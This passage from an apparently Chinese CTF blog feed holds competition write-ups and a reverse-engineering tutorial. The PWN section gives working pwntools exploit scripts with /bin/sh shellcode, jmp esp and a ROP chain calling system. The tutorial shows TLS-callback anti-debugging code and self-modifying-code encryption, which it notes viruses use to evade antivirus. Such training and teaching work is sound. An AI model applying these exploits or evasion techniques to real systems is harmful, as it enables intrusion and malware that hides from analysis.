<span class="keyword">byte</span>[] ke = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>) <span class="number">33</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">65</span>, (<span class="keyword">byte</span>) <span class="number">110</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, Byte.MIN_VALUE, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">98</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) <span class="number">76</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">127</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">39</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">90</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">99</span>, (<span class="keyword">byte</span>) <span class="number">108</span>, (<span class="keyword">byte</span>) <span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">78</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">70</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">116</span>, (<span class="keyword">byte</span>) <span class="number">2</span>, (<span class="keyword">byte</span>) <span class="number">126</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">73</span>, (<span class="keyword">byte</span>) <span class="number">13</span>, (<span class="keyword">byte</span>) <span class="number">113</span>, (<span class="keyword">byte</span>) <span class="number">73</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">82</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">114</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">120</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">92</span>, (<span class="keyword">byte</span>) <span class="number">7</span>, (<span class="keyword">byte</span>) <span class="number">115</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">19</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">10</span>, (<span class="keyword">byte</span>) <span class="number">44</span>, (<span class="keyword">byte</span>) <span class="number">77</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">76</span>&#125;;</div><div class="line">    String l = <span class="keyword">new</span> String(ke);    </div><div class="line">    System.out.println(encode(l,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8<br>flag : flag{Th1s_is_only_Rc4_you_Should_know_more}</p><h2 id="apk2"><a href="#apk2" class="headerlink" title="apk2"></a>apk2</h2><p>用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">   private static byte[] md5(String data) &#123;</div><div class="line">       try &#123;</div><div class="line">           MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;);</div><div class="line">           messageDigest.update(data.getBytes());</div><div class="line">           return messageDigest.digest();</div><div class="line">       &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">           e.printStackTrace();</div><div class="line">           return new byte[0];</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static byte[] encryptData(byte[] data, byte[] key) &#123;</div><div class="line">       byte keyLength = (byte) key.length;</div><div class="line">       byte[] cipherText = new byte[data.length];</div><div class="line">       for (int i = 0; i &lt; data.length; i++) &#123;</div><div class="line">           cipherText[i] = (byte) (data[i] ^ key[i % keyLength]);</div><div class="line">       &#125;</div><div class="line">       return cipherText;</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">   private static String generateRandomFilename(int length) &#123;</div><div class="line">       Random random = new Random();</div><div class="line">       StringBuilder stringBuilder = new StringBuilder(length);</div><div class="line">       for (int i = 0; i &lt; length; i++) &#123;</div><div class="line">           char temp = (char) random.nextInt(62);</div><div class="line">           if (temp &lt; &apos;\u001a&apos;) &#123;</div><div class="line">               temp = (char) (temp + 97);</div><div class="line">           &#125; else if (temp &lt; &apos;4&apos;) &#123;</div><div class="line">               temp = (char) (temp + 65);</div><div class="line">           &#125; else &#123;</div><div class="line">               temp = (char) (temp + 48);</div><div class="line">           &#125;</div><div class="line">           stringBuilder.append(temp);</div><div class="line">       &#125;</div><div class="line">       System.out.println(stringBuilder.toString());</div><div class="line">       return stringBuilder.toString();</div><div class="line">      </div><div class="line">   &#125;</div><div class="line">   private static byte[] readUri(String uri) throws IOException &#123;</div><div class="line">   File file = new File(uri);  </div><div class="line">       @SuppressWarnings(&quot;resource&quot;)</div><div class="line">InputStream inputStream = new FileInputStream(file);</div><div class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</div><div class="line">       byte[] buffer = new byte[1024];</div><div class="line">       while (true) &#123;</div><div class="line">           int read = inputStream.read(buffer);</div><div class="line">           if (read == -1) &#123;</div><div class="line">               return byteArrayOutputStream.toByteArray();</div><div class="line">           &#125;</div><div class="line">           byteArrayOutputStream.write(buffer, 0, read);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static void decode(byte[] cipherText) throws IOException &#123;</div><div class="line">   </div><div class="line">   </div><div class="line">   File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;);</div><div class="line">          try &#123;</div><div class="line">              FileOutputStream fileOutputStream = new FileOutputStream(outputFile);</div><div class="line">              fileOutputStream.write(cipherText);</div><div class="line">              fileOutputStream.close();</div><div class="line">          &#125;catch (Exception e) &#123;</div><div class="line">// TODO: handle exception</div><div class="line">&#125;</div><div class="line">          System.out.println(&quot;done&quot;);</div><div class="line">  </div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   </div><div class="line">   public static void main(String[] args) throws IOException &#123;</div><div class="line">   String password = &quot;Password&quot;;</div><div class="line">   byte[] key = md5(password);</div><div class="line">   String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;;</div><div class="line">   byte[] data=readUri(path);</div><div class="line">   byte[] data1=encryptData(data,key);</div><div class="line">   decode(data1);</div><div class="line">   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后用010打开，发现是一个压缩包，解压得到flag<br>flag{This_easy_encrypto_t0_file<em>hi$!&gt;</em>&lt;}</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="1、babypwn1"><a href="#1、babypwn1" class="headerlink" title="1、babypwn1"></a>1、babypwn1</h2><p>程序就不放了，这里可以下载（<a href="https://betamao.me）" target="_blank" rel="external">https://betamao.me）</a><br>分析程序，检查发现程序无任何保护<br><img src="https://i.imgur.com/52gZ58m.png" alt=""><br>我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值<br>这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：<br><code>payload = &#39;a&#39;*1000+&#39;dcba&#39;</code><br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./babypwn1'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1000</span>+<span class="string">'dcba'</span></div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="2、babypwn2"><a href="#2、babypwn2" class="headerlink" title="2、babypwn2"></a>2、babypwn2</h2><p>分析程序，检查发现程序无任何保护<br>发现这个函数，同时发现getShell函数<br><img src="https://i.imgur.com/WyLpecF.png" alt=""><br>那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：<br><img src="https://i.imgur.com/3xoBk7P.png" alt=""><br>那么我们只需要输入1012+4+ret(getShell的地址)就成功啦<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn2'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn2'</span>)</div><div class="line">ret=elf.symbols[<span class="string">'getShell'</span>]</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1016</span> +p32(ret)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="3、babypwn3"><a href="#3、babypwn3" class="headerlink" title="3、babypwn3"></a>3、babypwn3</h2><p>分析程序，检查发现程序无任何保护<br>发现存在溢出，并且当v2=127的时候，会去执行输入的代码<br><img src="https://i.imgur.com/McHlAzO.png" alt=""><br>可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)<br>方法一<br>1、输入shellcode<br>2、覆盖v7=127<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">payload = shellcode+<span class="string">'a'</span>*(<span class="number">127</span>-len(shellcode))+p32(<span class="number">127</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>方法二<br>1、存在jmp esp指令<br>2、栈溢出到jmp esp位置，执行shellcode<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">jmp_esp=<span class="number">0x8048500</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(jmp_esp)+shellcode</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><h2 id="4、babypwn4"><a href="#4、babypwn4" class="headerlink" title="4、babypwn4"></a>4、babypwn4</h2><p>分析程序，检查发现程序只有NX保护<br>潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn4'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn4'</span>)</div><div class="line">bss=elf.bss()</div><div class="line">read_plt=elf.plt[<span class="string">'read'</span>]</div><div class="line">system_plt=elf.plt[<span class="string">'system'</span>]</div><div class="line">pppr=<span class="number">0x8048639</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">245</span> +p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)+p32(system_plt)+p32(<span class="number">1</span>)+p32(bss)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这里我要睡觉了，就不解释了。有任何问题欢迎来问</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。&lt;br&gt;
    
    </summary>
    
      <category term="wp" scheme="http://yoursite.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>RE_绕过tls_与_SMC保护</title>
    <link href="http://yoursite.com/2018/05/09/re_tls/"/>
    <id>http://yoursite.com/2018/05/09/re_tls/</id>
    <published>2018-05-09T03:52:41.283Z</published>
    <updated>2018-05-02T02:42:17.660Z</updated>
    
    <content type="html"><![CDATA[<p>在main函数前，还有什么<br><a id="more"></a></p><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="1、何为tls"><a href="#1、何为tls" class="headerlink" title="1、何为tls"></a>1、何为tls</h2><p>TLS回调函数是指，每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP代码。</p><h2 id="2、编写tls函数"><a href="#2、编写tls函数" class="headerlink" title="2、编写tls函数"></a>2、编写tls函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="comment">//使用tls 回调函数</span></div><div class="line"><span class="comment">//使用TLS 的宏</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/INCLUDE:__tls_used"</span>)</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">lookupprocess</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">PROCESSENTRY32 pe32;</div><div class="line">pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</div><div class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>); <span class="comment">// 在快照中包含系统中所有的进程</span></div><div class="line">BOOL bMore = Process32First(hProcessSnap, &amp;pe32); <span class="comment">// 获得第一个进程的句柄</span></div><div class="line"><span class="keyword">while</span> (bMore)</div><div class="line">&#123;</div><div class="line">_wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+<span class="number">1</span>);</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollyice.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////WARNING///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ollydbg.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"peid.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"ida.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (!wcscmp(pe32.szExeFile, <span class="string">L"idaq.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line">bMore = Process32Next(hProcessSnap, &amp;pe32); <span class="comment">// 获取下一个进程的句柄</span></div><div class="line">&#125;</div><div class="line">CloseHandle(hProcessSnap);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Debugger</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line"><span class="keyword">int</span> result = <span class="number">0</span>;</div><div class="line">__asm &#123;</div><div class="line">mov eax, dword ptr fs:[<span class="number">30</span>h]<span class="comment">//TEB偏移30H处</span></div><div class="line">movzx eax, byte ptr ds:[eax + <span class="number">2</span>h]<span class="comment">//取PEB中BeingDebug，若为1则被调试</span></div><div class="line">mov result, eax</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (result) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"///////\nWARNING\n///////\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID h, DWORD reason, PVOID pv)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">lookupprocess();</div><div class="line">Debugger();</div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Not_Main_this_is_tls!"</span>, <span class="string">L"tls"</span>, MB_OK);</div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">".CRT$XLB"</span>)</span></div><div class="line">PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, <span class="number">0</span> &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></div><div class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"Main!"</span>, <span class="string">L"ESE"</span>, MB_OK);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="3、实践"><a href="#3、实践" class="headerlink" title="3、实践"></a>3、实践</h2><p>TLS callback函数的定义<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef VOID</div><div class="line">(NTAPI *PIMAGE_TLS_CALLBACK) (</div><div class="line">    PVOID DllHandle,     //模块句柄，即加载地址</div><div class="line">    DWORD Reason,        </div><div class="line">    PVOID Reserved</div><div class="line">    );</div><div class="line"></div><div class="line">其中reason有以下几种：(winNT.h)</div><div class="line"><span class="comment">#define DLL_PROCESS_ATTACH   1    进程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_ATTACH    2    线程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_DETACH    3    线程退出</span></div><div class="line"><span class="comment">#define DLL_PROCESS_DETACH   0    进程退出</span></div></pre></td></tr></table></figure></p><h2 id="3、手动去除TLS函数"><a href="#3、手动去除TLS函数" class="headerlink" title="3、手动去除TLS函数"></a>3、手动去除TLS函数</h2><p>例如：ida打开是这样的<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfix8jsj8j31750f2aah.jpg" alt=""><br>那就有TLS函数<br>1、OD去除TLS函数<br>OD运行，f9直接退出，因为会先执行TLS函数，这时需要设置成这样<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1flfj49nejej30r90ikq6b.jpg" alt=""><br>这就可以停在系统断点，可以看看tls函数做了什么，一般都是判断是否使用工具，ida,od，peid，如果有使用其中一种，程序直接退出，不会执行main函数<br>接着就一步一步的找TLS函数，找到直接把tls函数nop。<br>2、利用PEviewEXE和winhex去掉TLS函数<br>利用PEviewEXE查看PE文件的结构体,发现TLS结构体<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1flfjxsyhz4j316l0nh78k.jpg" alt=""><br>修改1<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfk389npmj30ny0eydhc.jpg" alt=""><br>修改为<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flfk4opm41j30lb0dqmy7.jpg" alt=""><br>修改2<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1flfk72dak1j315t0jq41a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1flfka5rrbkj30m40hhjse.jpg" alt=""><br>修改为<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flfkb8q07mj30jw0bi74m.jpg" alt=""><br>将修改后的文件另存为111.exe,ida打开<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flfkdw89zvj30up0d4dgi.jpg" alt=""><br>这是已经去掉TLS函数了，收工</p><h1 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h1><p>SMC是一种局部代码加密技术，通过对一段代码进行加密来达到增加逆向工程难度或者免杀的目的。SMC 技术是病毒常用的技巧。SMC不仅能使用汇编上实现，还能很容易的使用VC实现，但是有一个比较致命缺陷：要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>需要一点点的PE结构基础就ok啦。加密需要一个加密函数，这里我用简单的xor函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//加密函数</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc</span><span class="params">(<span class="keyword">char</span> *start,<span class="keyword">int</span> len)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) <span class="comment">//这里对地址进行简单的加密&gt;</span></div><div class="line">&#123;</div><div class="line">*(start+i) ^=<span class="number">0x88</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="编写SMC"><a href="#编写SMC" class="headerlink" title="编写SMC"></a>编写SMC</h2><p>所谓SMC（Self Modifying Code）技术,就是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程分序进行静态析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用SMC技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。<br>因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是SMC动态加密技术的精髓。 </p><h3 id="如何把敏感代码放入一个节表中？"><a href="#如何把敏感代码放入一个节表中？" class="headerlink" title="如何把敏感代码放入一个节表中？"></a>如何把敏感代码放入一个节表中？</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">"/SECTION:.text,ERWS"</span>)</span></div></pre></td></tr></table></figure><p>将这句话放在开始程序的开始(也就是include下面)，主要是让text节区可以执行(E)读(R)写(W)分享(S)</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div 